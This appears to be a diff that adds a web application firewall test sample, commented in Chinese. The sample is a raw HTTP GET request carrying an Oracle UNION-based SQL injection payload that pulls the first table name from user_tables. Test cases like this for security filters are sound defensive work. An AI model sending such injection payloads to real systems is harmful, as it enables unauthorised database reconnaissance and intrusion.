@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_普通注入-06506296
+# 攻击者基于UNION查询，将"union select table_name from user_tables where rownum=1"语句注入到 SQL 查询参数中，利用系统视图user_tables获取数据表中第一行表名信息。
+GET /?id=1%20union%20select%20table_name%20from%20user_tables%20where%20rownum=1&bid=hd_tag_m8mv249j HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv249j
+RM-PRO-Token: 962cd536501f1be3d2e16b5fad175895
+RM-PRO-Time: 1742808370720
+User-Agent: curl/7.83.1
+
